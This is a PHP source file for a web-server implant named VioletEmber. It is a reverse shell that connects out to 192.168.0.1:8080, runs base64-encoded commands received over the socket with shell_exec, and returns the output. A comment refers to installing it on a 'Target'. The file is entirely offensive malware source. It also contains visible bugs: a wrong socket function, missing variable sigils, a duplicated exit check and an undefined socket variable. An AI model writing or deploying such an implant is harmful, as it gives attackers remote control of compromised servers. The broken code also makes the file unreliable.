<?php
/*
VioletEmber PHP Implant
Version 1.0
*/

// Displays Errors for Debugging [Remove before installing on Target]
ini_set('display_errors',1);
ini_set('display_startup_errors',1);
error_reporting(E_ALL);

// Function to Encode and Decode Commands in Base 64
function b64_handler($text, $encode=false, $decode=false)
{
    if ($encode == true)
    {
        $converted_text = base64_encode($text);
        $converted_text = json_encode($converted_text);
    }
    if ($decode == true)
    {
        $converted_text = json_decode($text);
        $converted_text = base64_decode($converted_text);
    }
    return $converted_text;
}

// Reverse TCP Shell via Port 8080
$shell_port = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
// Connects to the Provided IP Address and Port
$connect = socket_create($shell_port, '192.168.0.1', 8080);

// Listens for Commands
while (true)
{
    $command = '';
    while ($data = socket_read($shell_port, 1024))
    {
        $command .= $data;
        if ($command[-1] == '"')
        {
            break;
        }
    }
    $command = b64_handler($command, $encode=false, $decode=true);

    if ($command == 'exit')
    {
        socket_close($shell_port);
        break;
    }

    if (command == 'exit')
    {
        $cwd = getcwd();
        socket_write($shell_port, b64_handler($cwd, $encode=true));
        continue;
    }
    $output = shell_exec($command . ' 2>&1');
    if (output)
    {
        socket_write($shell_port, b64_handler($output, $encode =true));
        continue;
    }
    if (substr($command, 0, 2) == 'cd')
    {
        chdir(substr($command, 3));
    }
    socket_write($rev_socket, b64_handler(' ', $encode=true));
}
?>
